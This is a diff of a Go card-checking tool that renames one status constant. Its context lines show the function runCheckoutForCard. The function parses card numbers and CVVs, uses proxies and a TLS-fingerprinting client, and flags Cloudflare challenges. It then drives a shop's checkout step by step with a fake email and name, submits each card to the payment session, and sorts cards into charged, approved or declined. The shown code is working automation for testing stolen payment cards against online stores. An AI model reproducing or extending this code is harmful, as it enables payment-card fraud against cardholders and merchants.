@@ -29,7 +29,7 @@ const (
 	StatusCharged  CheckStatus = iota // ORDER_PLACED
 	StatusApproved                    // non-charged success
 	StatusDeclined                    // FailedReceipt or 3DS
-	StatusError                       // could not complete checkout flow
+	CheckError                        // could not complete checkout flow
 )
 
 type CheckResult struct {
@@ -1722,7 +1722,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 
 	cardNumber, cardMonth, cardYear, cardCVV, err := parseCardEntry(cardEntry)
 	if err != nil {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Error = err
 		return result, err
 	}
@@ -1739,7 +1739,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	}
 	client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), clOptions...)
 	if err != nil {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Error = fmt.Errorf("failed to create tls client: %w", err)
 		return result, result.Error
 	}
@@ -1748,7 +1748,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	title, _, variantID, price, err := findCheapestProduct(client, shopURL)
 	_ = title
 	if err != nil {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Retryable = true
 		result.Error = fmt.Errorf("Step 0 failed: %w", err)
 		return result, result.Error
@@ -1757,7 +1757,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	// Step 1
 	checkoutURL, checkoutToken, sessionToken, checkoutHTML, err := addToCartAndCheckout(client, shopURL, variantID)
 	if err != nil {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Retryable = true
 		result.Error = fmt.Errorf("Step 1 failed: %w", err)
 		return result, result.Error
@@ -1766,7 +1766,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	buildID := extractCommitSha(checkoutHTML)
 	sourceToken := extractSourceToken(checkoutHTML)
 	if isCloudflareChallenge(checkoutHTML) {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Retryable = true
 		result.Error = fmt.Errorf("Step 1 failed: Cloudflare challenge detected")
 		return result, result.Error
@@ -1774,7 +1774,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	if stableID == "" || buildID == "" || sourceToken == "" {
 		fmt.Printf("  [ERR] Step1 missing: stableID=%v buildID=%v sourceToken=%v shop=%s\n",
 			stableID != "", buildID != "", sourceToken != "", shopURL)
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Retryable = true
 		result.Error = fmt.Errorf("Step 1 failed: missing stableId, buildId, or sourceToken")
 		return result, result.Error
@@ -1783,14 +1783,14 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	// Step 2
 	patID := extractPrivateAccessTokenID(checkoutHTML)
 	if patID == "" {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Retryable = true
 		result.Error = fmt.Errorf("Step 2 failed: could not extract private_access_token id")
 		return result, result.Error
 	}
 	_, err = fetchPrivateAccessToken(client, shopURL, checkoutURL, patID)
 	if err != nil {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Retryable = true
 		result.Error = fmt.Errorf("Step 2 failed: %w", err)
 		return result, result.Error
@@ -1799,14 +1799,14 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	// Step 3
 	actionsURL := extractActionsJSURL(checkoutHTML, shopURL)
 	if actionsURL == "" {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Retryable = true
 		result.Error = fmt.Errorf("Step 3 failed: could not find actions JS URL")
 		return result, result.Error
 	}
 	jsBody, err := fetchActionsJS(client, actionsURL, shopURL)
 	if err != nil {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Retryable = true
 		result.Error = fmt.Errorf("Step 3 failed: %w", err)
 		return result, result.Error
@@ -1814,7 +1814,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	proposalID := extractProposalID(jsBody)
 	submitID := extractSubmitForCompletionID(jsBody)
 	if proposalID == "" || submitID == "" {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Retryable = true
 		result.Error = fmt.Errorf("Step 3 failed: missing Proposal or Submit ID")
 		return result, result.Error
@@ -1826,12 +1826,12 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	// Step 4
 	_, proposalBody, err := sendProposal(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, currency, country)
 	if err != nil {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Error = fmt.Errorf("Step 4 failed: %w", err)
 		return result, result.Error
 	}
 	if hasCurrencyNotSupportedError(proposalBody) {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.StatusCode = "CURRENCY_NOT_SUPPORTED"
 		result.Error = errCurrencyNotSupported
 		return result, result.Error
@@ -1852,7 +1852,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 
 	queueToken := extractQueueToken(proposalBody)
 	if queueToken == "" {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Error = fmt.Errorf("Step 4 failed: could not extract queueToken")
 		return result, result.Error
 	}
@@ -1864,19 +1864,19 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	email := "sadsjahk@gmail.com"
 	_, proposal2Body, err := sendProposal2(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken, email, currency, country)
 	if err != nil {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Error = fmt.Errorf("Step 5 failed: %w", err)
 		return result, result.Error
 	}
 	if hasCurrencyNotSupportedError(proposal2Body) {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.StatusCode = "CURRENCY_NOT_SUPPORTED"
 		result.Error = errCurrencyNotSupported
 		return result, result.Error
 	}
 	queueToken2 := extractQueueToken(proposal2Body)
 	if queueToken2 == "" {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Error = fmt.Errorf("Step 5 failed: could not extract queueToken")
 		return result, result.Error
 	}
@@ -1885,19 +1885,19 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	addr := addressForCountry(country)
 	_, proposal3Body, err := sendProposal3(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken2, email, addr, currency, country)
 	if err != nil {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Error = fmt.Errorf("Step 6 failed: %w", err)
 		return result, result.Error
 	}
 	if hasCurrencyNotSupportedError(proposal3Body) {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.StatusCode = "CURRENCY_NOT_SUPPORTED"
 		result.Error = errCurrencyNotSupported
 		return result, result.Error
 	}
 	queueToken3 := extractQueueToken(proposal3Body)
 	if queueToken3 == "" {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Error = fmt.Errorf("Step 6 failed: could not extract queueToken")
 		return result, result.Error
 	}
@@ -1906,19 +1906,19 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	time.Sleep(200 * time.Millisecond)
 	_, proposal4Body, err := sendProposal3(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken3, email, addr, currency, country)
 	if err != nil {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Error = fmt.Errorf("Step 7 failed: %w", err)
 		return result, result.Error
 	}
 	if hasCurrencyNotSupportedError(proposal4Body) {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.StatusCode = "CURRENCY_NOT_SUPPORTED"
 		result.Error = errCurrencyNotSupported
 		return result, result.Error
 	}
 	queueToken4 := extractQueueToken(proposal4Body)
 	if queueToken4 == "" {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Error = fmt.Errorf("Step 7 failed: could not extract queueToken")
 		return result, result.Error
 	}
@@ -1927,13 +1927,13 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	time.Sleep(200 * time.Millisecond)
 	proposal5Status, proposal5Body, err := sendProposal3(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken4, email, addr, currency, country)
 	if err != nil {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Error = fmt.Errorf("Step 8 failed: %w", err)
 		return result, result.Error
 	}
 	_ = proposal5Status
 	if hasCurrencyNotSupportedError(proposal5Body) {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.StatusCode = "CURRENCY_NOT_SUPPORTED"
 		result.Error = errCurrencyNotSupported
 		return result, result.Error
@@ -1942,7 +1942,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	// Step 9
 	identSig := extractIdentificationSignature(checkoutHTML)
 	if identSig == "" {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Error = fmt.Errorf("Step 9 failed: could not extract identification signature")
 		return result, result.Error
 	}
@@ -1950,14 +1950,14 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	pciStatus, pciBody, err := sendPCISession(identSig, cardNumber, "james anderson", cardMonth, cardYear, cardCVV, siteName, proxyURL)
 	_ = pciStatus
 	if err != nil {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Error = fmt.Errorf("Step 9 failed: %w", err)
 		return result, result.Error
 	}
 
 	pciSessionID := extractPCISessionID(pciBody)
 	if pciSessionID == "" {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Error = fmt.Errorf("Step 9 failed: could not extract session ID")
 		return result, result.Error
 	}
@@ -1965,27 +1965,27 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	// Step 10
 	queueToken5 := extractQueueToken(proposal5Body)
 	if queueToken5 == "" {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Error = fmt.Errorf("Step 10 failed: could not extract queueToken")
 		return result, result.Error
 	}
 	deliveryHandle := extractDeliveryHandle(proposal5Body)
 	if deliveryHandle == "" {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Error = fmt.Errorf("%w: Step 10 failed: could not extract delivery handle", errStoreIncompatible)
 		result.Retryable = true
 		return result, result.Error
 	}
 	signedHandles := extractSignedHandles(proposal5Body)
 	if len(signedHandles) == 0 {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Error = fmt.Errorf("%w: Step 10 failed: could not extract signedHandles", errStoreIncompatible)
 		result.Retryable = true
 		return result, result.Error
 	}
 	shippingAmount := extractShippingAmount(proposal5Body)
 	if shippingAmount == "" {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Error = fmt.Errorf("%w: Step 10 failed: could not extract shipping amount", errStoreIncompatible)
 		result.Retryable = true
 		return result, result.Error
@@ -1995,7 +1995,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 		totalAmount = extractSellerTotal(proposal5Body)
 	}
 	if totalAmount == "" {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Error = fmt.Errorf("Step 10 failed: could not extract total amount")
 		return result, result.Error
 	}
@@ -2014,7 +2014,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	)
 	_ = submitStatus
 	if err != nil {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Error = fmt.Errorf("Step 10 failed: %w", err)
 		return result, result.Error
 	}
@@ -2051,14 +2051,14 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 			}
 		}
 		// No structured errors found — generic missing receipt
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Error = fmt.Errorf("%w: Step 10 failed: could not extract receiptId", errMissingReceiptID)
 		result.Retryable = true
 		return result, result.Error
 	}
 	receiptSessionToken := extractReceiptSessionToken(submitBody)
 	if receiptSessionToken == "" {
-		result.Status = StatusError
+		result.Status = CheckError
 		result.Error = fmt.Errorf("Step 10 failed: could not extract sessionToken")
 		return result, result.Error
 	}
@@ -2104,7 +2104,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 			pollForReceiptID, receiptID, receiptSessionToken,
 		)
 		if err != nil {
-			result.Status = StatusError
+			result.Status = CheckError
 			result.Error = fmt.Errorf("poll %d failed: %w", pollNum, err)
 			return result, result.Error
 		}
@@ -2151,7 +2151,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 				}
 			} else {
 				// No fallback available, mark as schema mismatch
-				result.Status = StatusError
+				result.Status = CheckError
 				result.StatusCode = "SCHEMA_MISMATCH"
 				result.Retryable = true
 				result.Error = fmt.Errorf("%w: poll %d: GraphQL schema mismatch on this store", errStoreIncompatible, pollNum)
@@ -2200,7 +2200,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 			default:
 				// Check for InventoryReservationFailure (no code field)
 				if strings.Contains(pollBody, "InventoryReservationFailure") {
-					result.Status = StatusError
+					result.Status = CheckError
 					result.StatusCode = "INVENTORY_FAILURE"
 					result.Retryable = true
 					result.Error = fmt.Errorf("retryable: inventory reservation failure")
@@ -2223,7 +2223,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 		time.Sleep(time.Duration(delay) * time.Millisecond)
 
 		if pollNum >= 60 {
-			result.Status = StatusError
+			result.Status = CheckError
 			result.Error = fmt.Errorf("exceeded 60 poll attempts")
 			return result, result.Error
 		}
